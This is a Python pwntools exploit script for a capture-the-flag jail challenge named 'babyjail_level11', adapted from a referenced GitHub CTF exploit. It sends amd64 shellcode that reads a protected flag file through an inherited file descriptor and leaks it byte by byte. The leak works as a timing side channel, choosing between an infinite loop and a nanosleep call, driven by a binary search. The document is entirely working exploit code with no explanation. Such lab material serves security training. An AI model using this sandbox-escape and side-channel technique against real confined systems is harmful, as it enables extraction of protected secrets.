##ref : https://github.com/jwang-a/CTF/blob/master/MyChallenges/Pwn/EDUshell/exp.py

from pwn import *

context.arch='amd64'

count = 0 

flag = ''

while True :
    low = 0x1f
    up = 0x7e

    while low+1 != up:
        r = process(['/challenge/babyjail_level11','/flag'])
        guess = (low+up)//2   
        p = asm(
        f'''
            jmp main

            loop:
                nop
                jmp loop

            main :
                mov rcx, 0x1337100

                mov rax, 0
                mov rdi, 3
                mov rsi, rcx
                mov rdx, 100
                syscall

                mov rcx, 0x1337100
                xor rbx, rbx
                mov bl, byte ptr [rcx+{count}]
                mov dl, {guess}
                cmp dl, bl
                jl loop
                
                push 0
                push 0

                mov rax, 35
                mov rdi, rsp
                mov rsi, 0
                syscall

        ''')
        r.send(p)
        r.recvuntil(b'Executing shellcode!\n\n')
        try:
            r.recv(timeout=0.5) 
            low = guess
        except:
            up = guess    
        r.close()
    
    flag+=chr(up)
    print(flag)
    if flag[count] == '}' :
        break
    count +=1

print(flag)
    






